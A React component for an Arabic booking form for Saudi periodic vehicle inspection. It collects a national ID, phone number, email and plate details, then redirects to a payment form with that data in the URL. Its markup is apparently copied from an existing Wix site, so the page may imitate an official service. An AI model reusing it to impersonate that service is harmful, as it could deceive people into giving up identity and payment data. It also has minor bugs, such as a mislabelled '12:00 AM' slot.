import React, { useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { TailSpin } from "react-loader-spinner";
import { countries, getCountryData } from "countries-list";
import NavBar from "../component/NavBar";
import Footer from "../component/Footer";
import { api_route, socket } from "../App";
const NewDate = () => {
  const [loading, setLoading] = useState(false);
  const places = [
    "أبها - المحالة أبها",
    "الباحة - طريق الملك عبدالعزيز",
    "الجبيل الجبيل35762",
    "الخرج حي الراشدية",
    "الخرمة حي المحمدية",
    "الخفجي الخرفة المنطقة الصناعية الثانية",
    "الدمام حي المنار",
    "الرس - طريق الملك فهد",
    "الرياض القيروان الرياض",
    "الرياض حي الفيصلية الرياض",
    " الرياض حي المونسية",
    "الرياض طريق دايراب عكاض الرياض",
    "الطائف حي القديرة",
    "القريات - WCJA6222, 6222 تركي بن احمد السديري حي الفرسان القريات",
    "القويعية حي الزهور القويعية",
    "المجمعة المنطقة الصناعية",
    "المدينة المنورة طريق المدينة - تبوك السريع",
    "الهفوف الشارع الرابع حي الصناعية المبرز",
    "بيشة - 1432, 7372, بيشة 67912",
    "تبوك المنطقة الزراعية",
    "جازان - الكرامة العسيلة",
    "جدة - الأمير عبدالمجيد جدة",
    "جدة - شارع عبدالجليل ياسين حي المروة",
    "جدة - طريق عسفان جدة",
    "حائل طريق المدينة - منطقة الوادي",
    "حفر الباطن طريق الملك عبدالعزيز الاسكان",
    "سكاكا - سلمان الفارسي محطة الفحص الدوري للمركبات ",
    "عرعر - معارض سيارات",
    "محايل عسير - الخالدية محايل عسير",
    "مكة المكرمة - العمرة الجديدة مكة",
    "نجران - طريق الملك عبدالعزيز نجران",
    "وادي الدواسر طريق خميس - السليل السريع",
    "ينبع لمبارك ينبع",
  ];
  const handleChange = (e) => {
    const { name, type, checked, value } = e.target;

    setData((prevData) => ({
      ...prevData,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const [errors, setErrors] = useState({});

  const [data, setData] = useState({
    vechile_status: "driving_licence",
    delegate: false,
    fullname: "",
    nation_number: "",
    phone: "",
    country_code: "966",
    email: "",
    country: "",
    first: "",
    second: "",
    third: "",
    board_number: "",
    customs_number: "",
    location: "",
    service_type: "الفحص الدوري",
    danger_vechile: false,
    vechile_type: "ثنائية العجلات",
    date_check: "",
    time_check: "08:00 AM",
    req_type: "",
  });

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();
    const newErrors = {};
    if (data.vechile_status === "driving_licence") {
      if (!data.country) newErrors.country = "مطلوب";
      if (!data.first) newErrors.first = "مطلوب";
      if (!data.second) newErrors.second = "مطلوب";
      if (!data.third) newErrors.third = "مطلوب";
    }
    if (!data.location) newErrors.location = "مطلوب";

    if (Object.keys(newErrors).length === 0) {
      setErrors({});
      const {
        first,
        second,
        third,
        customs_number,
        country,
        board_number,
        ...other
      } = data;
      if (data.vechile_status === "driving_licence") {
        const border_letter = `${third} | ${second} | ${first}`;
        await axios
          .post(api_route + "/reg", {
            border_letter,
            board_number,
            country,
            ...other,
          })
          .then(({ status,data }) => {
            const {user} = data
            sessionStorage.setItem("id", user._id);
            const final = JSON.stringify({
              ...other,
              country,
              board_number,
              border_letter,
            });
            if (status === 201)
              window.location.href = "/payment-form?data=" + final;
            else window.alert("حدث خطأ ما");
          });
      } else {
        await axios
          .post(api_route + "/req", {
            customs_number,
            ...other,
          })
          .then(({ status, data }) => {
            const { user } = data;
            sessionStorage.setItem("id", user._id);
            console.log(sessionStorage.getItem("id"));
            const final = JSON.stringify({ ...other, customs_number });
            if (status === 201)
              window.location.href = "/payment-form?data=" + final;
            else window.alert("حدث خطأ ما");
          });
      }
    } else {
      alert("املاء كل الخانات المطلوبة");
      setErrors(newErrors);
    }
  };

  const hours = [
    "08:00 AM",
    "08:30 AM",
    "09:00 AM",
    "09:30 AM",
    "10:00 AM",
    "10:30 AM",
    "11:00 AM",
    "11:30 AM",
    "12:00 AM",
    "12:30 PM",
    "01:00 PM",
    "01:30 PM",
    "02:00 PM",
    "02:30 PM",
    "03:00 PM",
    "03:30 PM",
    "04:00 PM",
    "04:30 PM",
    "05:00 PM",
    "05:30 PM",
    "06:00 PM",
  ];

  return (
    <>
      <NavBar />
      <div className="flex flex-col w-full justify-center items-center">
        {loading && (
          <div className="fixed top-0 w-full z-20  flex flex-col items-center justify-center h-screen left-0 bg-white ">
            <img src="/loading.avif" />
            <TailSpin
              height="50"
              width="50"
              color="gray"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
            <span className="text-green-500 text-xl mt-5">
              جاري حفظ البيانات المرسلة
            </span>
          </div>
        )}
        <form
          className="md:w-10/12 w-full flex flex-col p-5 gap-y-5"
          dir="rtl"
          onSubmit={handleSubmit}
        >
          <span className="md:w-1/6 w-1/2 text-2xl  text-sky-600">
            خدمة الفحص الفني الدوري
          </span>
          <span className="text-2xl  text-sky-600">حجز موعد</span>
          <div className="my-3 flex flex-col w-full">
            {/* info */}
            <div className="my-5">
              <span className="md:text-2xl text-xl">المعلومات الشخصية</span>

              <div className="w-full flex flex-col md:flex-row gap-x-3">
                <div className="flex flex-col md:w-1/2 my-2 py-3 gap-3">
                  <span className="text-xl">الإسم * </span>
                  <input
                    placeholder="إدخل الإسم"
                    className="border-2 border-gray-400 rounded-md px-2 py-2 outline-sky-500"
                    name="fullname"
                    value={data.fullname}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="flex flex-col md:w-1/2 my-2 py-3 gap-3">
                  <span className="text-xl">رقم الهوية / الإقامة *</span>
                  <input
                    placeholder="رقم الهوية  / الإقامة"
                    className="border-2 border-gray-400 rounded-md px-2 py-2 outline-sky-500"
                    name="nation_number"
                    value={data.nation_number}
                    onChange={handleChange}
                    required
                  />
                </div>
              </div>

              <div className="w-full flex gap-1">
                <div className="flex flex-col md:w-11/12 w-3/4 my-2 py-3 gap-2">
                  <span className="text-xl">رقم الجوال*</span>
                  <input
                    placeholder="رقم الجوال"
                    className="border-2 border-gray-400 rounded-md px-2 py-2 outline-sky-500"
                    name="phone"
                    value={data.phone}
                    onChange={handleChange}
                    min={9}
                    minLength={9}
                    max={10}
                    maxLength={10}
                    required
                  />
                </div>
                <div className="flex flex-col md:w-1/12 w-1/4 my-5  gap-2 justify-end ">
                  <select
                    placeholder=""
                    className="border-2 border-gray-400 rounded-md px-2  py-2 outline-sky-500"
                    name="country_code"
                    value={data.country_code}
                    onChange={handleChange}
                    required
                  >
                    <option>966</option>
                    <option>964</option>
                    <option>961</option>
                  </select>
                </div>
              </div>

              <div className="w-full flex gap-3">
                <div className="flex flex-col w-full my-2 py-3 gap-3">
                  <span className="text-xl">البريد الإلكتروني</span>
                  <input
                    placeholder="البريد الإلكتروني"
                    className="border-2 border-gray-400 rounded-md px-2 py-2 outline-sky-500"
                    name="email"
                    value={data.email}
                    onChange={handleChange}
                    required
                  />
                </div>
              </div>

              <div className="w-full flex items-center  gap-x-3 text-gray-500">
                <input
                  name="delegate"
                  id="delegate"
                  type="checkbox"
                  className="w-6 h-6"
                  onChange={handleChange}
                />
                <label
                  htmlFor="delegate"
                  className="select-none md:text-xl font-bold"
                >
                  هل تريد تفويض شخص اخر بفحص المركبة؟*
                </label>
              </div>
            </div>
            {/* vechile */}

            <div className="my-6">
              <span className="text-2xl ">معلومات المركبة</span>
              <div className="w-full flex flex-col md:flex-row gap-x-3">
                <div className="flex flex-col w-full my-2 py-3 gap-3">
                  <span className="text-lg text-center">
                    تحميل رخصة سير / أو بطاقة جمركية
                  </span>
                  <div className="flex md:flex-row flex-col w-full items-center gap-4 px-5">
                    <input
                      type="file"
                      className="w-2/3 shadow-lg shadow-green-200 text-black"
                    />
                  </div>
                </div>
              </div>
              {data.vechile_status === "driving_licence" ? (
                <>
                  <div className="flex flex-col my-5  gap-2  ">
                    <span className="text-xl">بلد التسجيل*</span>
                    <div className="relative w-full flex flex-col">
                      <select
                        placeholder=""
                        className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                        name="country"
                        value={data.country}
                        onChange={handleChange}
                      >
                        <option hidden>اختر</option>
                        <option>السعودية</option>
                        <option>البحرين</option>
                        <option>مصر</option>
                      </select>
                      {errors.country && (
                        <span className="text-red-500">{errors.country}</span>
                      )}
                    </div>
                    {}
                  </div>
                  <div className="flex w-full flex-col ">
                    <span className="text-xl">رقم اللوحة * </span>
                    <input
                      placeholder="أرقام "
                      value={data.board_number}
                      name="board_number"
                      onChange={handleChange}
                      required
                      max={4}
                      maxLength={4}
                      min={4}
                      minLength={4}
                      className="border-2 w-1/3 text-center border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                    />
                    <div className="w-full flex flex-col md:flex-row mt-5 gap-4">
                      <div className="relative">
                        <select
                          className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                          value={data.first}
                          name="first"
                          onChange={handleChange}
                        >
                          <option hidden> حرف1</option>

                          <option
                            value="أ"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            أ
                          </option>
                          <option
                            value="ب"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ب
                          </option>
                          <option
                            value="ح"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ح
                          </option>
                          <option
                            value="د"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            د
                          </option>
                          <option
                            value="ر"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ر
                          </option>
                          <option
                            value="س"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            س
                          </option>
                          <option
                            value="ص"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ص
                          </option>
                          <option
                            value="ط"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ط
                          </option>
                          <option
                            value="ع"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ع
                          </option>
                          <option
                            value="ق"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ق
                          </option>
                          <option
                            value="ك"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ك
                          </option>
                          <option
                            value="ل"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ل
                          </option>
                          <option
                            value="م"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            م
                          </option>
                          <option
                            value="ن"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ن
                          </option>
                          <option
                            value="ه"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ه
                          </option>
                          <option
                            value="و"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            و
                          </option>
                          <option
                            value="ي"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ي
                          </option>
                        </select>
                        {errors.first && (
                          <span className="text-red-500 absolute md:top-10  md:right-0 right-28 top-2">
                            {errors.first}
                          </span>
                        )}
                      </div>
                      <div className="relative">
                        <select
                          className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                          value={data.second}
                          name="second"
                          onChange={handleChange}
                        >
                          <option
                            value=""
                            disabled=""
                            class="R4tv1w U5WS_f"
                            selected=""
                            hidden
                          >
                            حرف2
                          </option>
                          <option
                            value="أ"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            أ
                          </option>
                          <option
                            value="ب"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ب
                          </option>
                          <option
                            value="ح"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ح
                          </option>
                          <option
                            value="د"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            د
                          </option>
                          <option
                            value="ر"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ر
                          </option>
                          <option
                            value="س"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            س
                          </option>
                          <option
                            value="ص"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ص
                          </option>
                          <option
                            value="ط"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ط
                          </option>
                          <option
                            value="ع"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ع
                          </option>
                          <option
                            value="ق"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ق
                          </option>
                          <option
                            value="ك"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ك
                          </option>
                          <option
                            value="ل"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ل
                          </option>
                          <option
                            value="م"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            م
                          </option>
                          <option
                            value="ن"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ن
                          </option>
                          <option
                            value="ه"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ه
                          </option>
                          <option
                            value="و"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            و
                          </option>
                          <option
                            value="ي"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ي
                          </option>
                        </select>
                        {errors.second && (
                          <span className="text-red-500 absolute md:top-10  md:right-0 right-28 top-2">
                            {errors.second}
                          </span>
                        )}
                      </div>
                      <div className="relative">
                        <select
                          className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                          value={data.third}
                          name="third"
                          onChange={handleChange}
                        >
                          <option
                            value=""
                            disabled=""
                            class="R4tv1w U5WS_f"
                            selected=""
                            hidden
                          >
                            حرف3
                          </option>
                          <option
                            value="أ"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            أ
                          </option>
                          <option
                            value="ب"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ب
                          </option>
                          <option
                            value="ح"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ح
                          </option>
                          <option
                            value="د"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            د
                          </option>
                          <option
                            value="ر"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ر
                          </option>
                          <option
                            value="س"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            س
                          </option>
                          <option
                            value="ص"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ص
                          </option>
                          <option
                            value="ط"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ط
                          </option>
                          <option
                            value="ع"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ع
                          </option>
                          <option
                            value="ق"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ق
                          </option>
                          <option
                            value="ك"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ك
                          </option>
                          <option
                            value="ل"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ل
                          </option>
                          <option
                            value="م"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            م
                          </option>
                          <option
                            value="ن"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ن
                          </option>
                          <option
                            value="ه"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ه
                          </option>
                          <option
                            value="و"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            و
                          </option>
                          <option
                            value="ي"
                            class="R4tv1w"
                            aria-selected="false"
                          >
                            ي
                          </option>
                        </select>
                        {errors.third && (
                          <span className="text-red-500 absolute md:top-10  md:right-0 right-28 top-2">
                            {errors.third}
                          </span>
                        )}
                      </div>
                    </div>
                  </div>
                </>
              ) : (
                ""
              )}
            </div>

            {/*service */}

            <div className="w-full flex flex-col md:flex-row gap-x-3">
              <div className="flex flex-col md:w-1/2 my-2 py-3 gap-3">
                <span className="text-xl">نوع التسجيل*</span>
                <select
                  className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                  name="req_type"
                  value={data.req_type}
                  onChange={handleChange}
                >
                  <option hidden>اختر</option>
                  <option value="خصوصي" class="R4tv1w" aria-selected="true">
                    خصوصي
                  </option>
                  <option value="نقل عام" class="R4tv1w" aria-selected="false">
                    نقل عام
                  </option>
                  <option value="نقل خاص" class="R4tv1w" aria-selected="false">
                    نقل خاص
                  </option>
                  <option value="مقطورة" class="R4tv1w" aria-selected="false">
                    مقطورة
                  </option>
                  <option
                    value="دراجة نارية"
                    class="R4tv1w"
                    aria-selected="false"
                  >
                    دراجة نارية
                  </option>
                  <option
                    value="مركبة اجرة"
                    class="R4tv1w"
                    aria-selected="false"
                  >
                    مركبة اجرة
                  </option>
                  <option value="تصدير" class="R4tv1w" aria-selected="false">
                    تصدير
                  </option>
                  <option
                    value="دراجة نارية ترفيهية"
                    class="R4tv1w"
                    aria-selected="false"
                  >
                    دراجة نارية ترفيهية
                  </option>
                  <option
                    value="هيئة دبلوماسية"
                    class="R4tv1w"
                    aria-selected="false"
                  >
                    هيئة دبلوماسية
                  </option>
                  <option
                    value="حافلة عامة"
                    class="R4tv1w"
                    aria-selected="false"
                  >
                    حافلة عامة
                  </option>
                  <option
                    value="حافلة خاصة"
                    class="R4tv1w"
                    aria-selected="false"
                  >
                    حافلة خاصة
                  </option>
                  <option value="مؤقتة" class="R4tv1w" aria-selected="false">
                    مؤقتة
                  </option>
                  <option
                    value="مركبة أشغال عامة"
                    class="R4tv1w"
                    aria-selected="false"
                  >
                    مركبة أشغال عامة
                  </option>
                </select>
              </div>
            </div>

            <div className="my-6 w-full">
              <span className="text-2xl ">مركز الخدمة</span>
              <div className="w-full flex flex-col md:flex-row gap-x-3">
                <div className="flex flex-col md:w-1/2 my-2 py-3 gap-3">
                  <span className="text-xl">نوع المركبة*</span>
                  <select
                    className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                    name="vechile_type"
                    value={data.vechile_type}
                    onChange={handleChange}
                  >
                    <option hidden>اختر</option>
                    <option value="" disabled="" class="R4tv1w U5WS_f">
                      اختر نوع خدمة الفحص
                    </option>
                    <option
                      value="سيارة خاصة"
                      class="R4tv1w"
                      aria-selected="true"
                    >
                      سيارة خاصة
                    </option>
                    <option
                      value="مركبة نقل خفيفة خاصة"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      مركبة نقل خفيفة خاصة
                    </option>
                    <option
                      value="سيارة أصحاب الهمم"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      سيارة أصحاب الهمم
                    </option>
                    <option
                      value="نقل ثقيل"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      نقل ثقيل
                    </option>
                    <option
                      value="مركبة نقل خفيفة"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      مركبة نقل خفيفة
                    </option>
                    <option
                      value="حافلة خفيفة"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      حافلة خفيفة
                    </option>
                    <option
                      value="نقل متوسط"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      نقل متوسط
                    </option>
                    <option
                      value="حافلة كبيرة"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      حافلة كبيرة
                    </option>
                    <option
                      value="الدراجات ثنائية العجلات"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      الدراجات ثنائية العجلات
                    </option>
                    <option
                      value="مركبات أشغال عامة"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      مركبات أشغال عامة
                    </option>
                    <option
                      value="دراجة ثلاثية أو رباعية العجلات"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      دراجة ثلاثية أو رباعية العجلات
                    </option>
                    <option
                      value="مقطورة ثقيلة"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      مقطورة ثقيلة
                    </option>
                    <option
                      value="سيارات الأجرة"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      سيارات الأجرة
                    </option>
                    <option
                      value="سيارات التأجير"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      سيارات التأجير
                    </option>
                    <option
                      value="نصف مقطورة ثقيلة"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      نصف مقطورة ثقيلة
                    </option>
                    <option
                      value="حافلة متوسطة"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      حافلة متوسطة
                    </option>
                    <option
                      value="مقطورة خفيفة"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      مقطورة خفيفة
                    </option>
                    <option
                      value="نصف مقطورة خفيفة"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      نصف مقطورة خفيفة
                    </option>
                    <option
                      value="نصف مقطورة خفيفة خاصة"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      نصف مقطورة خفيفة خاصة
                    </option>
                    <option
                      value="مقطورة خفيفة خاصة"
                      class="R4tv1w"
                      aria-selected="false"
                    >
                      مقطورة خفيفة خاصة
                    </option>
                  </select>
                </div>
              </div>

              <div className="flex flex-col my-5  gap-2  ">
                <span className="text-xl"> نوع خدمة الفحص*</span>
                <select
                  placeholder=""
                  className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                  name="service_type"
                  value={data.service_type}
                  onChange={handleChange}
                  required
                >
                  <option
                    value=""
                    disabled=""
                    class="R4tv1w U5WS_f"
                    selected=""
                    hidden
                  >
                    اختر نوع خدمة الفحص
                  </option>
                  <option
                    value="خدمة الفحص الدوري"
                    class="R4tv1w"
                    aria-selected="false"
                  >
                    خدمة الفحص الدوري
                  </option>
                  <option
                    value="الفحص النظري للدعم"
                    class="R4tv1w"
                    aria-selected="false"
                  >
                    الفحص النظري للدعم
                  </option>
                  <option
                    value="خدمة إعادة الإختبار"
                    class="R4tv1w"
                    aria-selected="false"
                  >
                    خدمة إعادة الإختبار
                  </option>
                  <option
                    value="خدمة إعادة الإختبار القديم"
                    class="R4tv1w"
                    aria-selected="false"
                  >
                    خدمة إعادة الإختبار القديم
                  </option>
                </select>
                <span className="text-gray-500">
                  <span class="wixui-rich-text__text  ">
                    إذا لم تكن متأكداً من نوع المركبة، فيمكنك العثور عليها في{" "}
                    <span
                      className="text-green-500 font-bold "
                      style={{ textDecoration: "underline" }}
                    >
                      أنواع المركبات
                    </span>
                  </span>
                </span>
              </div>
            </div>

            {/*date */}

            <div className="my-6 w-full">
              <div className="w-full flex flex-col md:flex-row gap-x-3">
                <div className="flex flex-col md:w-1/2 my-2 py-3 gap-3">
                  <span className="text-xl">المنطقة * </span>
                  <select
                    className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                    name="location"
                    value={data.location}
                    onChange={handleChange}
                  >
                    <option hidden>اختر المنطقة</option>
                    {places.map((place) => (
                      <option>{place}</option>
                    ))}
                  </select>
                  {errors.location && (
                    <span className="text-red-500">{errors.location}</span>
                  )}
                </div>
                <div className="flex flex-col md:w-1/2 my-2 py-3 gap-3">
                  <span className="text-xl">تاريخ الفحص*</span>
                  <input
                    className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                    name="date_check"
                    value={data.date_check}
                    onChange={handleChange}
                    type="date"
                    required
                  />
                </div>
                <div className="flex flex-col md:w-1/2 my-2 py-3 gap-3">
                  <span className="text-xl">موعد الخدمة*</span>
                  <select
                    className="border-2 border-gray-400 rounded-md px-2  py-1 outline-sky-500"
                    name="time_check"
                    value={data.time_check}
                    onChange={handleChange}
                  >
                    <option hidden>اختر</option>
                    {hours.map((hour) => (
                      <option>{hour}</option>
                    ))}
                  </select>
                  {errors.time_check && (
                    <span className="text-red-500">{errors.time_check}</span>
                  )}
                </div>
              </div>
              <span className="text-gray-500">
                الحضور على الموعد يسهم في سرعة وجودة الخدمة وفي حالة عدم الحضور،
                لن يسمح بحجز اخر إلا بعد 48 ساعة وحسب الإوقات المحددة
              </span>
            </div>

            {/*submit */}

            <div className="w-full flex items-center justify-center my-6">
              <button
                className="text-white hover:opacity-90 rounded-full min-w-48 bg-green-600 py-3 px-2 text-xl "
                type="submit"
              >
                التالي
              </button>
            </div>
          </div>
        </form>
      </div>
    </>
  );
};

export default NewDate;
